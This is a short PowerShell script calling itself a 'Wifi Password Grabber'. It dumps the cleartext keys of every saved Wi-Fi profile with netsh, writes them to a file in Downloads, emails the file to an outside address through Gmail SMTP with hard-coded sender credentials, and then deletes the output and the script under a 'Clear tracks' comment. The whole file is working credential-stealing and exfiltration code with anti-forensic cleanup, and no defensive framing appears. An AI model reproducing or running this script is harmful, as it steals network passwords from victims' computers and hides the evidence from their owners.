# All the necessary files will be saved in the following directory. It is always better to use Download folder as the current user has access to right the data to Download folder.
$p = "$HOME\Downloads\wifipass"
mkdir $p
cd $p

# Get all saved wifi password
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > wifipass.txt

# Email the output file
# Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
$FROM = "Your email "
$PASS = "password for the email"
$TO = "to email"

$PC_NAME = "$env:computername"
$SUBJECT = "Wifi Password Grabber - " + $PC_NAME
$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the attached file."
$ATTACH = "wifipass.txt"

Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
# End email

# Clear tracks
rm *.txt
cd ..
rm wifipass

# remove script file
rm script.ps1
